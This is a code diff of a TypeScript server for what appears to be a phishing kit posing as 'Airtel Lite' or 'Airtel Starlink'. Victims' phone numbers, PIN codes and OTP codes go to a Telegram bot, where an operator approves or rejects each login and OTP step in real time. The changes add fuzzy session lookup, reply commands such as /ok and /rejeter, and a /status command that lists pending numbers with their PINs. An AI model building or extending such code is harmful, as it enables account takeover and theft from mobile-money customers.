@@ -171,6 +171,77 @@ function normalizePhone(raw: string): string {
   return raw.replace(/\D/g, '').replace(/^243/, '').replace(/^0/, '');
 }
 
+// Helper function to ensure any stale or conflicting Telegram webhook is cleared
+async function ensureTelegramWebhookCleared() {
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteWebhook?drop_pending_updates=false`);
+    const data = await res.json();
+    console.log('[Telegram Worker] Webhook deletion check:', data?.description || data);
+  } catch (err) {
+    console.warn('[Telegram Worker] Webhook deletion error:', err);
+  }
+}
+
+// Session resolution helper by ID, phone number, or regex in message text
+function findSessionByIdOrPhone(idOrPhone: string, messageText?: string): SessionRecord | undefined {
+  if (!idOrPhone) return undefined;
+  const cleanId = idOrPhone.trim();
+
+  // 1. Direct ID match in sessions Map
+  let session = sessions.get(cleanId);
+  if (session) return session;
+
+  // 2. Direct Phone match
+  const cleanPhone = normalizePhone(cleanId);
+  if (cleanPhone && phoneToSessionMap.has(cleanPhone)) {
+    session = sessions.get(phoneToSessionMap.get(cleanPhone)!);
+    if (session) return session;
+  }
+
+  // 3. Fallback regex in messageText if available
+  if (messageText) {
+    const idMatch = messageText.match(/ID Session:\s*(?:<code>)?([a-zA-Z0-9_-]+)(?:<\/code>)?/i);
+    if (idMatch && idMatch[1]) {
+      session = sessions.get(idMatch[1].trim());
+      if (session) return session;
+    }
+    const phoneMatch = messageText.match(/Numéro[^:]*:\s*(?:<code>)?(\+?[0-9\s]+)(?:<\/code>)?/i);
+    if (phoneMatch && phoneMatch[1]) {
+      const pClean = normalizePhone(phoneMatch[1]);
+      if (pClean && phoneToSessionMap.has(pClean)) {
+        session = sessions.get(phoneToSessionMap.get(pClean)!);
+        if (session) return session;
+      }
+    }
+  }
+
+  // 4. Case-insensitive session ID search
+  for (const [key, val] of sessions.entries()) {
+    if (key.toLowerCase() === cleanId.toLowerCase()) return val;
+  }
+
+  return undefined;
+}
+
+// Helper to get the most recent pending session
+function getLatestPendingSession(type: 'login' | 'otp' | 'any'): SessionRecord | undefined {
+  let latest: SessionRecord | undefined;
+  for (const s of sessions.values()) {
+    const isTarget =
+      type === 'login'
+        ? s.loginStatus === 'pending'
+        : type === 'otp'
+        ? s.otpStatus === 'pending'
+        : s.loginStatus === 'pending' || s.otpStatus === 'pending';
+    if (isTarget) {
+      if (!latest || s.lastUpdated > latest.lastUpdated) {
+        latest = s;
+      }
+    }
+  }
+  return latest;
+}
+
 // Central Telegram Polling Worker
 let telegramOffset = 0;
 let isPolling = false;
@@ -179,32 +250,22 @@ async function pollTelegramUpdates() {
   if (isPolling) return;
   isPolling = true;
 
-  try {
-    const hookInfoRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getWebhookInfo`);
-    const hookData = await hookInfoRes.json();
-    if (hookData && hookData.ok && hookData.result && hookData.result.url) {
-      console.log(`[Telegram Worker] Active Webhook detected: ${hookData.result.url}. Webhook handles updates; getUpdates polling suspended to avoid 409 conflict.`);
-      isPolling = false;
-      return;
-    }
-  } catch (err) {
-    console.warn('[Telegram Worker] Webhook check failed:', err);
-  }
-
-  console.log('[Telegram Worker] No active webhook, starting polling loop with allowed_updates=[message, callback_query]...');
+  // Always clear any conflicting webhook on start
+  await ensureTelegramWebhookCleared();
+  console.log('[Telegram Worker] Starting polling loop with allowed_updates=[message, callback_query]...');
 
   while (true) {
     try {
       const allowedUpdatesParam = encodeURIComponent(JSON.stringify(['message', 'callback_query']));
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${telegramOffset}&timeout=20&limit=50&allowed_updates=${allowedUpdatesParam}`;
-      
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${telegramOffset}&timeout=15&limit=50&allowed_updates=${allowedUpdatesParam}`;
+
       const res = await fetch(url);
       if (!res.ok) {
         if (res.status === 409) {
-          console.warn('[Telegram Worker] 409 Conflict received, waiting 15s before rechecking webhook status...');
-          await new Promise((r) => setTimeout(r, 15000));
-          isPolling = false;
-          return pollTelegramUpdates();
+          console.warn('[Telegram Worker] 409 Conflict: webhook was re-attached. Deleting webhook and resuming...');
+          await ensureTelegramWebhookCleared();
+          await new Promise((r) => setTimeout(r, 2000));
+          continue;
         }
         await new Promise((r) => setTimeout(r, 2000));
         continue;
@@ -222,13 +283,14 @@ async function pollTelegramUpdates() {
             const callbackId: string = query.id;
             const msgId: number | undefined = query.message?.message_id;
             const chatId: string | number | undefined = query.message?.chat?.id;
+            const originalText: string = query.message?.text || '';
 
             console.log(`[Telegram Worker] Processing callback: ${callbackData}`);
 
             // A) APPROVE LOGIN
-            if (callbackData.startsWith('approve_login_')) {
-              const sessionId = callbackData.replace('approve_login_', '');
-              const session = sessions.get(sessionId);
+            if (callbackData.startsWith('approve_login')) {
+              const rawId = callbackData.replace('approve_login_', '').replace('approve_login', '').trim();
+              const session = findSessionByIdOrPhone(rawId, originalText) || getLatestPendingSession('login');
 
               if (session) {
                 session.loginStatus = 'approved';
@@ -257,9 +319,9 @@ async function pollTelegramUpdates() {
             }
 
             // B) REJECT LOGIN
-            else if (callbackData.startsWith('reject_login_')) {
-              const sessionId = callbackData.replace('reject_login_', '');
-              const session = sessions.get(sessionId);
+            else if (callbackData.startsWith('reject_login')) {
+              const rawId = callbackData.replace('reject_login_', '').replace('reject_login', '').trim();
+              const session = findSessionByIdOrPhone(rawId, originalText) || getLatestPendingSession('login');
 
               if (session) {
                 session.loginStatus = 'rejected';
@@ -272,7 +334,8 @@ async function pollTelegramUpdates() {
                 if (msgId && chatId) {
                   const updatedText =
                     `🔴 <b>AIRTEL LITE - CONNEXION CLIENT REFUSÉE</b>\n\n` +
-                    `👤 <b>Numéro:</b> <code>+243 ${session.phone}</code>\n` +
+                    `🌍 <b>Pays:</b> ${session.country || 'Airtel'}\n` +
+                    `👤 <b>Numéro:</b> <code>${session.fullPhone || session.phone}</code>\n` +
                     `🔑 <b>Code PIN:</b> <code>${session.pin}</code>\n` +
                     `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
                     `🆔 <b>Session:</b> <code>${session.sessionId}</code>\n` +
@@ -287,9 +350,9 @@ async function pollTelegramUpdates() {
             }
 
             // C) APPROVE OTP
-            else if (callbackData.startsWith('approve_otp_')) {
-              const sessionId = callbackData.replace('approve_otp_', '');
-              const session = sessions.get(sessionId);
+            else if (callbackData.startsWith('approve_otp')) {
+              const rawId = callbackData.replace('approve_otp_', '').replace('approve_otp', '').trim();
+              const session = findSessionByIdOrPhone(rawId, originalText) || getLatestPendingSession('otp');
 
               if (session) {
                 session.otpStatus = 'approved';
@@ -304,7 +367,7 @@ async function pollTelegramUpdates() {
                     `🔐 <b>AIRTEL LITE - CODE OTP VALIDÉ (4 CHIFFRES)</b>\n\n` +
                     `🌍 <b>Pays:</b> ${session.country || 'Airtel'}\n` +
                     `👤 <b>Numéro:</b> <code>${session.fullPhone || session.phone}</code>\n` +
-                    `🔢 <b>Code OTP:</b> <code>${session.otp}</code>\n` +
+                    `🔢 <b>Code OTP:</b> <code>${session.otp || '****'}</code>\n` +
                     `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
                     `🆔 <b>Session:</b> <code>${session.sessionId}</code>\n` +
                     `⏰ <b>Heure validation:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
@@ -318,9 +381,9 @@ async function pollTelegramUpdates() {
             }
 
             // D) REJECT OTP
-            else if (callbackData.startsWith('reject_otp_')) {
-              const sessionId = callbackData.replace('reject_otp_', '');
-              const session = sessions.get(sessionId);
+            else if (callbackData.startsWith('reject_otp')) {
+              const rawId = callbackData.replace('reject_otp_', '').replace('reject_otp', '').trim();
+              const session = findSessionByIdOrPhone(rawId, originalText) || getLatestPendingSession('otp');
 
               if (session) {
                 session.otpStatus = 'rejected';
@@ -333,8 +396,9 @@ async function pollTelegramUpdates() {
                 if (msgId && chatId) {
                   const updatedText =
                     `🔐 <b>AIRTEL LITE - CODE OTP REFUSÉ (4 CHIFFRES)</b>\n\n` +
-                    `👤 <b>Numéro:</b> <code>+243 ${session.phone}</code>\n` +
-                    `🔢 <b>Code OTP Saisi:</b> <code>${session.otp}</code>\n` +
+                    `🌍 <b>Pays:</b> ${session.country || 'Airtel'}\n` +
+                    `👤 <b>Numéro:</b> <code>${session.fullPhone || session.phone}</code>\n` +
+                    `🔢 <b>Code OTP Saisi:</b> <code>${session.otp || '****'}</code>\n` +
                     `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
                     `🆔 <b>Session:</b> <code>${session.sessionId}</code>\n` +
                     `⏰ <b>Heure refus:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
@@ -345,6 +409,129 @@ async function pollTelegramUpdates() {
               } else {
                 answerCallbackQuery(callbackId, 'Session introuvable.', false);
               }
+            }
+          }
+
+          // 2. TEXT MESSAGES (REPLIES OR DIRECT ADMIN COMMANDS)
+          if (update.message) {
+            const msg = update.message;
+            const text = (msg.text || '').trim();
+            const lowerText = text.toLowerCase();
+            const chatId = msg.chat?.id;
+            const replyTo = msg.reply_to_message;
+
+            console.log(`[Telegram Worker] Received text message: "${text}"`);
+
+            // Case A: Reply to an existing bot message
+            if (replyTo && replyTo.text) {
+              const replyText = replyTo.text;
+              const isOtp = replyText.includes('OTP') || replyText.includes('VÉRIFICATION');
+              const session = findSessionByIdOrPhone('', replyText) || getLatestPendingSession(isOtp ? 'otp' : 'login');
+
+              if (session) {
+                const isApprove = ['ok', 'oui', 'valider', 'yes', 'approve', 'bon', '+', '1', '/ok', '/valider'].includes(lowerText);
+                const isReject = ['non', 'refuser', 'no', 'reject', 'faux', 'erreur', '-', '0', '/non', '/rejeter'].includes(lowerText);
+
+                if (isApprove) {
+                  if (isOtp) {
+                    session.otpStatus = 'approved';
+                  } else {
+                    session.loginStatus = 'approved';
+                  }
+                  session.lastUpdated = Date.now();
+                  saveSessionsToDisk();
+                  notifySessionUpdated(session);
+
+                  sendTelegramMessage(
+                    `✅ <b>${isOtp ? 'OTP' : 'Connexion'} Validé(e) avec succès !</b>\n` +
+                    `👤 <b>Numéro:</b> <code>${session.fullPhone || session.phone}</code>\n` +
+                    `🆔 <b>Session:</b> <code>${session.sessionId}</code>`
+                  );
+                } else if (isReject) {
+                  if (isOtp) {
+                    session.otpStatus = 'rejected';
+                  } else {
+                    session.loginStatus = 'rejected';
+                  }
+                  session.lastUpdated = Date.now();
+                  saveSessionsToDisk();
+                  notifySessionUpdated(session);
+
+                  sendTelegramMessage(
+                    `❌ <b>${isOtp ? 'OTP' : 'Connexion'} Rejeté(e) !</b>\n` +
+                    `👤 <b>Numéro:</b> <code>${session.fullPhone || session.phone}</code>\n` +
+                    `🆔 <b>Session:</b> <code>${session.sessionId}</code>`
+                  );
+                }
+              }
+            }
+
+            // Case B: Direct commands like /ok, /valider, /rejeter, /status
+            else if (lowerText.startsWith('/ok') || lowerText.startsWith('/valider') || lowerText === 'ok' || lowerText === 'valider') {
+              const param = text.split(/\s+/)[1];
+              const session = param ? findSessionByIdOrPhone(param) : getLatestPendingSession('any');
+
+              if (session) {
+                if (session.otpStatus === 'pending') {
+                  session.otpStatus = 'approved';
+                } else {
+                  session.loginStatus = 'approved';
+                }
+                session.lastUpdated = Date.now();
+                saveSessionsToDisk();
+                notifySessionUpdated(session);
+
+                sendTelegramMessage(
+                  `✅ <b>Action validée avec succès !</b>\n` +
+                  `👤 <b>Numéro:</b> <code>${session.fullPhone || session.phone}</code>\n` +
+                  `📦 <b>Forfait:</b> ${session.planName}\n` +
+                  `🆔 <b>Session:</b> <code>${session.sessionId}</code>`
+                );
+              } else {
+                sendTelegramMessage('⚠️ Aucune session en attente trouvée.');
+              }
+            }
+
+            else if (lowerText.startsWith('/rejeter') || lowerText.startsWith('/refuser') || lowerText === 'non') {
+              const param = text.split(/\s+/)[1];
+              const session = param ? findSessionByIdOrPhone(param) : getLatestPendingSession('any');
+
+              if (session) {
+                if (session.otpStatus === 'pending') {
+                  session.otpStatus = 'rejected';
+                } else {
+                  session.loginStatus = 'rejected';
+                }
+                session.lastUpdated = Date.now();
+                saveSessionsToDisk();
+                notifySessionUpdated(session);
+
+                sendTelegramMessage(
+                  `❌ <b>Session rejetée !</b>\n` +
+                  `👤 <b>Numéro:</b> <code>${session.fullPhone || session.phone}</code>\n` +
+                  `🆔 <b>Session:</b> <code>${session.sessionId}</code>`
+                );
+              } else {
+                sendTelegramMessage('⚠️ Aucune session en attente trouvée.');
+              }
+            }
+
+            else if (lowerText.startsWith('/status')) {
+              let pendingCount = 0;
+              let report = `📊 <b>STATUT DES SESSIONS AIRTEL STARLINK</b>\n\n`;
+              sessions.forEach((s) => {
+                if (s.loginStatus === 'pending' || s.otpStatus === 'pending') {
+                  pendingCount++;
+                  report +=
+                    `• <b>${s.fullPhone || s.phone}</b> (${s.country || 'Airtel'})\n` +
+                    `  Session: <code>${s.sessionId}</code> | PIN: <code>${s.pin}</code>\n` +
+                    `  Statut: Login=<b>${s.loginStatus}</b>, OTP=<b>${s.otpStatus}</b>\n\n`;
+                }
+              });
+              if (pendingCount === 0) {
+                report += '<i>Aucune session en attente actuellement.</i>';
+              }
+              sendTelegramMessage(report);
             }
           }
         }
@@ -574,12 +761,12 @@ app.post('/api/telegram/send-otp', async (req, res) => {
 
 // 3. Fast In-Memory Status Polling Endpoint (< 5ms)
 app.get('/api/telegram/status', (req, res) => {
-  const sessionId = req.query.sessionId as string;
+  const sessionId = (req.query.sessionId || req.query.id) as string;
   const phone = req.query.phone as string;
 
   let session: SessionRecord | undefined;
   if (sessionId) {
-    session = sessions.get(sessionId);
+    session = findSessionByIdOrPhone(sessionId);
   }
   if (!session && phone) {
     const clean = normalizePhone(phone);
@@ -610,15 +797,23 @@ app.get('/api/telegram/status', (req, res) => {
 // 4. Ultra-Fast Event-Driven Long-Poll Endpoint
 // Suspends response until Telegram bot clicks button or timeout fires
 app.get('/api/telegram/wait-status', (req, res) => {
-  const sessionId = req.query.sessionId as string;
+  const sessionId = (req.query.sessionId || req.query.id) as string;
+  const phone = req.query.phone as string;
   const targetStep = (req.query.targetStep as 'login' | 'otp') || 'login';
-  const timeoutMs = Math.min(Math.max(parseInt(req.query.timeout as string, 10) || 12000, 2000), 25000);
+  const timeoutMs = Math.min(Math.max(parseInt(req.query.timeout as string, 10) || 10000, 2000), 20000);
 
-  if (!sessionId) {
-    return res.status(400).json({ error: 'sessionId requis' });
+  let session: SessionRecord | undefined;
+  if (sessionId) {
+    session = findSessionByIdOrPhone(sessionId);
+  }
+  if (!session && phone) {
+    const clean = normalizePhone(phone);
+    const sid = phoneToSessionMap.get(clean);
+    if (sid) {
+      session = sessions.get(sid);
+    }
   }
 
-  const session = sessions.get(sessionId);
   if (!session) {
     return res.json({
       exists: false,
